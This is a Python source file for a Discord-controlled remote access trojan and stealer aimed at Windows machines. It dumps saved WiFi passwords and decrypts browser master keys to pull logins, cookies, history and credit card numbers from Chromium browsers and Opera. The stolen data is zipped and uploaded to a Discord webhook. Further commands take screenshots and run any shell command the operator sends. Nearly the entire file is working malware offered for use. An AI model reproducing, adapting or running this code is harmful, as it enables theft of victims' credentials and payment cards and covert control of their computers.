from discord.ext import commands
import discord
import subprocess
from discord import Embed, File, SyncWebhook
import io
from PIL import ImageGrab
import os
import ctypes
import base64
import wmi
import ctypes
import psutil
import uuid
import re
import requests
from Crypto.Cipher import AES
from zipfile import ZipFile
import sqlite3
import shutil
from pathlib import Path
from win32crypt import CryptUnprotectData
import psutil
import json
import atexit
#start
USER_TOKEN=12
SERVER_TOKEN=12
DISCORD_TOKEN="sd"
#end
def user_data():
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        display_name = display_name()
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')

        return (
            ":bust_in_silhouette: User",
            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
            False
        )

def system_data():
    def get_hwid() -> str:
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        return hwid

    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                0].TotalVisibleMemorySize) / 1048576, 0)
    hwid = get_hwid()

    return (
        "<:CPU:1004131852208066701> System",
        f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
        False
    )

def disk_data():
    disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
    for part in psutil.disk_partitions(all=False):
        if os.name == 'nt':
            if 'cdrom' in part.opts or part.fstype == '':
                continue
        usage = psutil.disk_usage(part.mountpoint)
        disk += ("{:<9} "*4).format(part.device, str(
            usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

    return (
        ":floppy_disk: Disk",
        f"```{disk}```",
        False
    )
def network_data():
        def geolocation(ip: str) -> str:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()

            return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])

        ip = requests.get("https://api.ipify.org").text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_ = geolocation(ip)

        return (
            ":satellite: Network",
            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
            False
        )

def wifi_data():
    networks, out = [], ''
    try:
        wifi = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
        wifi = [i.split(":")[1][1:-1]
                for i in wifi if "All User Profile" in i]

        for name in wifi:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1]
                            for b in results if "Key Content" in b]
            except subprocess.CalledProcessError:
                networks.append((name, ''))
                continue

            try:
                networks.append((name, results[0]))
            except IndexError:
                networks.append((name, ''))

    except subprocess.CalledProcessError:
        pass

    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
    out += f'{"-"*20}|{"-"*29}\n'
    for name, password in networks:
        out += '{:<20}| {:<}\n'.format(name, password)

    return (
        ":signal_strength: WiFi",
        f"```{out}```",
        False
    )

class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()
            


class Chromium:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], self.master_key)
            __COOKIES__.append(Types.Cookie(
                row[0], row[1], row[2], cookie, row[4]))

        conn.close()
        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Opera:
    def __init__(self) -> None:
        self.roaming = os.getenv("APPDATA")
        self.paths = {
            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'opera': self.roaming + '\\Opera Software\\Opera Stable'
        }

        for _, path, in self.paths.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            operations = [
                self.get_login_data,
                self.get_cookies,
                self.get_web_history,
                self.get_downloads,
                self.get_credit_cards
            ]

            for operation in operations:
                try:
                    operation(path)
                except Exception as e:
                    pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str) -> None:
        login_db = f'{path}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        cursor.close()
        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str) -> None:
        cookies_db = f'{path}\\Network\\Cookies'
        if not os.path.exists(cookies_db):
            return

        shutil.copy(cookies_db, 'cookies_db')
        conn = sqlite3.connect('cookies_db')
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute(
            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = self.decrypt_password(row[3], self.master_key)

            row = [x.decode('latin-1') if isinstance(x, bytes)
                   else x for x in row]
            __COOKIES__.append(Types.Cookie(
                row[0], row[1], row[2], cookie, row[4]))

        cursor.close()
        conn.close()
        os.remove('cookies_db')

    def get_web_history(self, path: str) -> None:
        history_db = f'{path}\\History'
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        cursor.close()
        conn.close()
        os.remove('history_db')

    def get_downloads(self, path: str) -> None:
        downloads_db = f'{path}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        cursor.close()
        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str) -> None:
        cards_db = f'{path}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        cursor.close()
        conn.close()
        os.remove('cards_db')

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []
class Browsers:
    def __init__(self, webhook):
        self.webhook = SyncWebhook.from_url(webhook)

        Chromium()
        Opera()
        Upload(self.webhook)


class Upload:
    def __init__(self, webhook: SyncWebhook):
        self.webhook = webhook

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs("Harvest", exist_ok=True)
        if __LOGINS__:
            with open("Harvest\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("Harvest\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("Harvest\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("Harvest\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("Harvest\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("Harvest.zip", "w") as zip:
            for file in os.listdir("Harvest"):
                zip.write(f"Harvest\\{file}", file)

    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Harvest",
                description="```" +
                '\n'.join(self.tree(Path("Harvest"))) + "```",
            ),
            file=File("Harvest.zip"),
        )

    def clean(self):
        shutil.rmtree("Harvest")
        os.remove("Harvest.zip")

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '🗃️ - ', midfix_file: str = '📂 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


def Exec(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
help_command = commands.DefaultHelpCommand(
    no_category = 'Commands'
)

intents = discord.Intents().all()
bot = commands.Bot(command_prefix='!', description="Greatings, My Lord !", help_command=help_command, intents=intents)



@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)
@bot.command()
async def screenshot(ctx):
    result = "Yes my lord !"
    await ctx.send(result)
    image = ImageGrab.grab()
    buffer = io.BytesIO()
    image.save(buffer, 'JPEG')
    buffer.seek(0)
    await ctx.send(file=discord.File(buffer, 'screenshot.jpg'))
@bot.command()
async def info(ctx):
    result = "Yes my lord !, i am now scaning the system"
    await ctx.send(result)
    user_info = user_data()
    system_info = system_data()
    disk_info = disk_data()

    embed = discord.Embed(title="System Information", color=0x00ff00)
    embed.add_field(name=user_info[0], value=user_info[1], inline=user_info[2])
    embed.add_field(name=system_info[0], value=system_info[1], inline=system_info[2])
    embed.add_field(name=disk_info[0], value=disk_info[1], inline=disk_info[2])

    await ctx.send(embed=embed)
@bot.command()
async def net(ctx):
    result = "Yes my lord !, i am now harvesting the network"
    await ctx.send(result)
    network_info = network_data()
    wifi_info = wifi_data()

    embed = discord.Embed(title="Network Information", color=0x00ff00)
    embed.add_field(name=network_info[0], value=network_info[1], inline=network_info[2])
    embed.add_field(name=wifi_info[0], value=wifi_info[1], inline=wifi_info[2])

    await ctx.send(embed=embed)
@bot.command()
async def steal(ctx):
    # Instantiate and use the new classes you added here
    result = "Yes my lord !, i am now harvesting the system"
    await ctx.send(result)
    
    __CONFIG__ = {
    'webhook': webhook_url,
    
    'browsers': True
    
    
}
    funcs = [
        
        Browsers,
       
    
    ]

    for func in funcs:
        if __CONFIG__[func.__name__.lower()]:
            if func.__init__.__code__.co_argcount == 2:
                func(__CONFIG__['webhook'])
            else:
                func()
    

@bot.command()
async def exit(ctx):
    global on_ready_executed
    
       
    if on_ready_executed:
        guild = bot.get_guild(SERVER_TOKEN)  # Replace YOUR_GUILD_ID with the actual guild ID
        print(webhook_url)
        channel_number = 1
        while True:
            channel = discord.utils.get(guild.text_channels, name=f"session-{channel_number}")
            if channel is not None:
                await channel.delete()
                print(f"Private channel '{channel.name}' deleted.")
                channel_number += 1
            else:
                break


        # Get the current channel ID
        channel_id = ctx.channel.id

        # Send a request to the Discord API to delete the channel using the webhook URL
           # Replace YOUR_WEBHOOK_URL with your actual webhook URL
        payload = {
            'content': f'Deleting channel {channel_id}'
        }
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 204:
            print(f"Channel {channel_id} deletion request sent successfully")
        else:
            print(f"Failed to send channel deletion request for {channel_id}. Status code: {response.status_code}")

on_ready_executed = False


WEBHOOK_ID_FILE = "webhook_id.txt"
termination_channel_id = None  # Define a global variable to store the termination channel ID

webid = 5
webhook_url = ""
webtoken="ds"
Hname=""
@bot.event
async def on_ready():
    global webhook_url
    global webid
    
    global on_ready_executed
    global termination_channel_id
    global Hname
    if not on_ready_executed:
        guild = bot.get_guild(SERVER_TOKEN)  # Replace YOUR_GUILD_ID with the actual guild ID
        
        channel_number = 1
        while True:
            new_channel_name = f"session-{channel_number}"
            channel = discord.utils.get(guild.text_channels, name=new_channel_name)
            termination_channel = discord.utils.get(guild.text_channels, name=new_channel_name)
            Hname=new_channel_name
            if termination_channel is not None:
                termination_channel_id = termination_channel.id  # Store the termination channel ID

            if channel is None:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    bot.user: discord.PermissionOverwrite(read_messages=True)
                }
                channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                webhook = await channel.create_webhook(name="MyWebhook")
                print(f"Private channel '{channel.name}' and webhook '{webhook.name}' created.")
                with open(WEBHOOK_ID_FILE, "w") as file:
                    file.write(f"{webhook.id}\n{webhook.token}")  # Convert webhook.id to a string
                webid = str(webhook.id)  # Update webid with the new webhook ID
                webtoken=str(webhook.token)
                webhook_url = f"https://discord.com/api/webhooks/{webid}/{webtoken}"
                break
            else:
                channel_number += 1
    else:
        if os.path.exists(WEBHOOK_ID_FILE):
            with open(WEBHOOK_ID_FILE, "r") as file:
                stored_webhook_id = file.readline().strip()
                stored_webhook_token = file.readline().strip()
                webid = stored_webhook_id  # Update webid with the stored webhook ID
                webtoken = stored_webhook_token
                webhook_url = f"https://discord.com/api/webhooks/{webid}/{webtoken}"
               
                on_ready_executed = True
        else:
            guild = bot.get_guild(SERVER_TOKEN)  # Replace YOUR_GUILD_ID with the actual guild ID
           
            channel_number = 1
            while True:
                new_channel_name = f"session-{channel_number}"
                channel = discord.utils.get(guild.text_channels, name=new_channel_name)
                if channel is None:
                    overwrites = {
                        guild.default_role: discord.PermissionOverwrite(read_messages=False),
                        bot.user: discord.PermissionOverwrite(read_messages=True)
                    }
                    channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                    webhook = await channel.create_webhook(name="Cypher")
                    print(f"Private channel '{channel.name}' and webhook '{webhook.name}' created.")
                    with open(WEBHOOK_ID_FILE, "w") as file:
                        file.write(f"{webhook.id}\n{webhook.token}")  # Convert webhook.id to a string
                    webid = str(webhook.id) 
                    webtoken=str(webhook.token)
                    webhook_url = f"https://discord.com/api/webhooks/{webid}/{webtoken}"
                     # Update webid with the new webhook ID
                    break
                else:
                    channel_number += 1
    return webhook_url, webid


@bot.event        
async def on_message(message):   
   
    id = False
  
    global webid
    global webhook_url


      # Check if the message is from a webhook
        # Replace 'YOUR_WEBHOOK_ID' with the actual webhook ID associated with the bot
    webhook_id =None
    webhooks = await message.channel.webhooks()
# Check if the list of webhooks is not empty
    if webhooks:
    # Use the first webhook's ID as needed in your code
        webhook_id = webhooks[0].id

    if webhook_id == int(webid):
            id=True
            # Send a response if the webhook ID matches
            
        
            
            
            if message.author.id == USER_TOKEN and id==True :
             
               
                if message.content.startswith('!'):
                    await bot.process_commands(message)  # Process commands
                else:
                    output = Exec(message.content)
                    if output:
                        while output:
                            await message.channel.send(output[:2000])
                            output = output[2000:]

        
    else:
            # Send a response if the webhook ID does not match
            id=False
            
            print("ID does not match")
           
@bot.event
async def on_disconnect():
    guild = bot.get_guild(SERVER_TOKEN)  # Replace YOUR_GUILD_ID with the actual guild ID
    channel = discord.utils.get(guild.text_channels, name=Hname)  # Replace your-channel-name with the actual channel name
    if channel is not None:
        await channel.send("Lost connection")
@bot.event
async def send_termination_message():
    global termination_channel_id
    if termination_channel_id is not None:
        channel = bot.get_channel(termination_channel_id)  # Get the termination channel using the stored ID
        if channel is not None:
            try:
                await channel.send("Program terminated")
            except:
                pass  # Handle the exception if the channel cannot be accessed
            await channel.delete()  # Delete the termination channel

atexit.register(send_termination_message)
if __name__ == "__main__":

    bot.run(DISCORD_TOKEN)